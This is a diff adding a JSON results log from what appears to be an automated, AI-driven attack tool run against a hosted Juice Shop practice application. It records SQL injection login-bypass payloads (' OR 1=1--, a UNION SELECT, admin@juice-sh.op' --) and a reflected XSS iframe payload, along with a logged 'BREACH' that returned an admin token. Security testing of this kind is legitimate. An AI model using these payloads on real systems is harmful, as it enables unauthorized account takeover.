@@ -1,0 +1,137 @@
+{
+  "run_id": "r1779567034",
+  "target_url": "https://juice-shop-production-d0c5.up.railway.app",
+  "started_at": "2026-05-23T20:10:34Z",
+  "finished_at": "2026-05-23T20:12:20Z",
+  "duration_s": 105.807421737,
+  "generations_run": 1,
+  "total_pods": 3,
+  "outcome": "BREACH",
+  "best_fitness": 1,
+  "breach": {
+    "pod_id": "r1779567034-g1-p0",
+    "generation": 1,
+    "vector": "sqli_login",
+    "category": "injection",
+    "evidence": "admin token returned via SQL bypass",
+    "raw_findings": [
+      {
+        "method": "POST",
+        "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"}",
+        "status_code": 200,
+        "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+      }
+    ]
+  },
+  "per_generation": [
+    {
+      "generation": 1,
+      "population": 3,
+      "survivors": 1,
+      "best_fitness": 1,
+      "breaches": 1,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "none",
+            "pod_id": "none",
+            "generation": 1,
+            "vector": "sqli_login",
+            "category": "injection",
+            "status": "BREACH",
+            "fitness": 1,
+            "evidence": "admin token returned via SQL bypass",
+            "raw_findings": [
+              {
+                "method": "POST",
+                "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"}",
+                "status_code": 200,
+                "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+              }
+            ],
+            "duration_ms": 1100,
+            "t": 1779567066600
+          },
+          "Fitness": 1,
+          "PodID": "r1779567034-g1-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "status": "",
+            "fitness": 0,
+            "evidence": "The application is vulnerable to SQL injection in the 'email' field of the '/rest/user/login' endpoint. By injecting a payload like 'admin@juice-sh.op' --, I was able to successfully authenticate as the admin user without knowing the password. The response contained a valid JWT token for the admin user.",
+            "raw_findings": [
+              {
+                "description": "SQL injection in email field of /rest/user/login allows bypassing authentication.",
+                "details": "Payload: admin@juice-sh.op' --",
+                "severity": "critical",
+                "type": "vulnerability"
+              }
+            ],
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779567034-g1-p1"
+        },
+        {
+          "Genome": {
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "technique": "reflected",
+            "target_path": "/#/search",
+            "params": {
+              "q": "\u003ciframe src=javascript:alert(1)\u003e"
+            },
+            "hint": "Try reflected XSS via search query parameter."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779567034",
+            "pod_id": "r1779567034-g1-p2",
+            "generation": 1,
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 62000,
+            "t": 1779567097614
+          },
+          "Fitness": 0,
+          "PodID": "r1779567034-g1-p2"
+        }
+      ]
+    }
+  ],
+  "narrative_md_path": "out/summary-r1779567034.md"
+}
